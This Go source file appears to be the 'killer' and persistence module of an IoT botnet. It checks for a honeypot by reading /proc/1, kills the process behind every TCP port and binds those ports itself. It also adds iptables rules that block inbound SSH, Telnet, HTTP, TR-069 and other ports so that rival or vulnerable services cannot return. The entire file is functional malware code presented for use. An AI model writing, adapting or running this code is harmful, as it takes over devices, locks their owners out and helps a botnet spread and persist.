package security

import (
	"bot/lib/utils"
	"fmt"
	"github.com/zenthangplus/goccm"
	"io/ioutil"
	"math/big"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

func BindPort(Port int) bool {
	berr := 0

	for utils.InstanceRunning {
		c, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", Port))

		if err != nil {
			if berr >= 15 {
				break
			}

			utils.HandleError(err)
			berr++
			continue
		}

		// Keep the port bind forever....
		go func() {
			for utils.InstanceRunning {
				conn, err := c.Accept()

				if err != nil {
					continue
				}

				// goodbye <3
				conn.Close()
			}

			c.Close()
		}()

		return true
	}

	return false
}

func BindInstancePort() {
	if !BindPort(utils.SingleInstancePort) {
		utils.Debug("[Instance] Another instance was detected, exit..")
		os.Exit(1)
	}

	utils.Debug(fmt.Sprintf("[Instance] Single instance port %d was successfully bind", utils.SingleInstancePort))
}

func EscapeHoneyPot() {
	files, err := ioutil.ReadDir("/proc/1/")

	if err != nil {
		utils.Debug("[HONEY POT] Error reading /proc/1/")
		SafeExit()
	}

	if len(files) == 0 {
		utils.Debug("[HONEY POT] Empty /proc/1/, exit..")
		SafeExit()
	}

	utils.Debug("[HONEY POT] Safe environment")
}

func FindPidByInode(Inode string) int {
	Files, Err := ioutil.ReadDir("/proc/")
	Pids := []string{}

	if Err != nil {
		return 0
	}

	for _, File := range Files {
		Pids = append(Pids, File.Name())
	}

	FPid := ""
	for _, Pid := range Pids {
		Fds, err := ioutil.ReadDir(fmt.Sprintf("/proc/%s/fd/", Pid))

		if err != nil {
			continue
		}

		for _, Fd := range Fds {
			r, err := os.Readlink(fmt.Sprintf("/proc/%s/fd/%s", Pid, Fd.Name()))

			if err != nil {
				continue
			}

			if strings.Contains(r, Inode) {
				FPid = string(Pid)
			}
		}
	}

	PidInt, Err := strconv.Atoi(FPid)

	if Err != nil {
		return 0
	}

	return PidInt
}

func KillByPort(Port int, Bind bool) {
	Lines, Err := utils.ReadLines("/proc/net/tcp")
	utils.HandleError(Err)

	for _, Proc := range Lines {
		// sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
		// 0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0  14598 1 7f4c860a 100 0 0 10 0

		// PID   USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
		// 28687 pi        20   0   14712   5028   4000 S   0.7   0.1   0:08.54 sshd

		ProcPort := new(big.Int)
		ProcPort.SetString(Proc[15:][:5], 16)

		if ProcPort.Int64() == int64(Port) {
			Inode := strings.Split(Proc[92:], " ")[0]
			Pid := FindPidByInode(Inode)

			// [FIXED] [ERROR] Kill itself, -> solve: check PID
			// get current PID

			if Pid == utils.PID {
				continue
			}

			utils.Debug(fmt.Sprintf("[KILLER] Found PID %d for Inode %s, Killing", Pid, Inode))

			Process, Err := os.FindProcess(Pid)
			utils.HandleError(Err)

			KErr := Process.Kill()
			time.Sleep(1 * time.Second)
			BErr := true

			if Bind {
				BErr = BindPort(Port)
			}

			if KErr == nil && BErr {
				utils.Debug(fmt.Sprintf("[KILLER] Successfully killed process #%d and over-bind port %d", Pid, Port))
			}
		}
	}
}

func StartKiller() {
	// Port to kill and bind to prevent vulnerable process from restarting...
	DefaultPort := []int{
		22,       // SSH
		25,       // SMTP
		80,       // HTTP
		443,      // HTTPs
		50023,    //Huawei
		23, 2323, // TELNET
		8080, 3126, // Proxy etc.
		7547, 35000, // Tr-069
	}

	Err := exec.Command("ulimit", "-n", "999999").Run()
	if utils.HandleError(Err) {
		utils.Debug("[KILLER] Failed to set ulimit")
	}

	go UninstallProcess()
	go PatchDevice()
	go Install()

	go func() {
		// [ERROR] exec: "iptables": executable file not found in $PATH

		for _, Port := range DefaultPort {
			Err := exec.Command("iptables", "-A", "INPUT", "-p", "tcp", "-s", "0/0", "-d", "0/0", "--dport", strconv.Itoa(Port), "-j", "DROP").Run()
			if !utils.HandleError(Err) {
				utils.Debug(fmt.Sprintf("[KILLER] Droped INPUT port %d", Port))
			}
		}
	}()

	for {
		c := goccm.New(50)
		for port := 0; port != 65536; port++ {
			if port == utils.SingleInstancePort || port == 22 {
				continue
			}

			c.Wait()
			go func(port int) {
				defer c.Done()
				KillByPort(port, utils.InListInt(port, DefaultPort))
			}(port)
		}

		c.WaitAllDone()
		time.Sleep(3 * time.Minute)
	}
}
